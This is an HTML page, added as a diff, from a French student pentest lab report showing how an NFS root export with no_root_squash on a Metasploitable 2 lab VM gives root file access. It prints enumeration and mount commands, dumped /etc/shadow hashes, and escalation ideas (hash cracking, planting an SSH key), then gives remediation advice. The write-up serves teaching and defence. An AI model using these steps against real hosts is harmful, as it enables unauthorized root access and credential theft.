@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NFS root export — no_root_squash — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">NFS — export racine en no_root_squash</h1>
+    <h2 class="doc-subtitle">Racine exportée à tous : accès root au filesystem distant sans exploit</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>NFS — port <code class="mono">2049</code> (via rpcbind <code class="mono">111</code>)</td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">Faiblesse</td><td>Export <code>/ *</code> en lecture/écriture avec <code>no_root_squash</code></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Accès root au filesystem cible</strong> (lecture de <code>/etc/shadow</code>, du home de root)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification — énumération RPC puis NFS</h2>
+  <p>NFS partage des répertoires sur le réseau et s'appuie sur le portmapper RPC (port 111).
+  On interroge d'abord <code>rpcbind</code> pour cartographier les services RPC et leurs ports
+  réels (souvent dynamiques, invisibles à un scan de ports classique) :</p>
+
+  <pre class="terminal">$ rpcinfo -p 192.168.56.101
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100003    2,3,4 tcp 2049  nfs
+    100005    1,2,3 tcp 41969 mountd
+    100021   1,3,4 tcp 50825  nlockmgr
+    100024    1   tcp  37243  status</pre>
+
+  <p>Le service <code>nfs</code> est présent sur 2049. On liste alors les répertoires
+  exportés :</p>
+
+  <pre class="terminal">$ showmount -e 192.168.56.101
+Export list for 192.168.56.101:
+/ *</pre>
+
+  <blockquote class="evidence">
+    <code>/ *</code> : la <strong>racine entière</strong> du système est exportée à
+    <strong>toutes</strong> les adresses (<code>*</code>). Associée à
+    <code>no_root_squash</code>, cette configuration donne un accès root distant sans
+    authentification.
+  </blockquote>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms2-nfs/01-recon-showmount.png" alt="rpcinfo et showmount révélant l'export racine">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc"><code>rpcinfo -p</code> confirme le service NFS, et
+      <code>showmount -e</code> révèle l'export <code>/ *</code> (racine ouverte à tous).</span>
+      <span class="fname">images/ms2-nfs/01-recon-showmount.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Démarche d'exploitation — montage et no_root_squash</h2>
+  <p>Le montage NFS nécessite les droits root <strong>locaux</strong> (sur Kali). On monte la
+  racine distante :</p>
+
+  <pre class="terminal">$ sudo mount -t nfs -o vers=3 192.168.56.101:/ /tmp/nfs_ms2
+$ mount | grep nfs_ms2
+192.168.56.101:/ on /tmp/nfs_ms2 type nfs (rw,relatime,vers=3,...,addr=192.168.56.101)</pre>
+
+  <p>Comme l'export est en <code>no_root_squash</code>, notre root local est traité comme le
+  root de la cible : on lit des fichiers normalement réservés à root, à commencer par
+  <code>/etc/shadow</code> :</p>
+
+  <pre class="terminal">$ sudo head -5 /tmp/nfs_ms2/etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+
+$ sudo ls -la /tmp/nfs_ms2/root
+drwx------  2 root root  ... .ssh
+-rw-------  1 root root  ... .rhosts
+-rwx------  1 root root  ... reset_logs.sh
+...</pre>
+
+  <p>La lecture de <code>/etc/shadow</code> (fichier <code>root:shadow</code>, interdit à tout
+  utilisateur normal) et l'accès au home de root prouvent l'accès <strong>root</strong> au
+  filesystem distant.</p>
+
+  <h2 class="section">3. Preuve d'accès obtenu</h2>
+  <p>Trois éléments établissent la compromission : montage NFS <code>rw</code> de la racine
+  distante, lecture du hash root dans <code>/etc/shadow</code>
+  (<code>root:$1$/avpfBJ1$...</code>), et accès complet au home de root
+  (<code>.ssh</code>, <code>.rhosts</code>). L'escalade vers un shell root est ensuite triviale :
+  casser le hash récupéré, ou déposer une clé publique dans
+  <code>/root/.ssh/authorized_keys</code> via le montage et se connecter en SSH root sans mot de
+  passe.</p>
+
+  <figure class="capture" id="cap-proof">
+    <img src="../images/ms2-nfs/02-mount-shadow.png" alt="Montage NFS, lecture de /etc/shadow et du home de root">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Montage de <code>192.168.56.101:/</code>, puis lecture de
+      <code>/etc/shadow</code> (hash root exposé) et du home de root — preuve de l'accès root au
+      filesystem distant via <code>no_root_squash</code>.</span>
+      <span class="fname">images/ms2-nfs/02-mount-shadow.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Ne jamais exporter <code>/</code> ; limiter les exports au strict répertoire
+      nécessaire.</li>
+      <li>Restreindre les exports à des hôtes nommés (jamais <code>*</code>), en lecture seule
+      (<code>ro</code>) quand c'est possible.</li>
+      <li>Conserver <code>root_squash</code> (le défaut sûr) pour que le root distant soit mappé
+      sur un compte sans privilège — <code>no_root_squash</code> est à proscrire.</li>
+      <li>Filtrer l'accès RPC/NFS (ports 111 et 2049) au pare-feu, hors réseau de confiance.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">5. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/nfs.md"><code>ms2/josa/nfs.md</code></a> (dépôt du labo)</li>
+    <li>Option <code>no_root_squash</code> de <code>exports(5)</code> — mauvaise configuration NFS classique.</li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — NFS root export (no_root_squash)</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
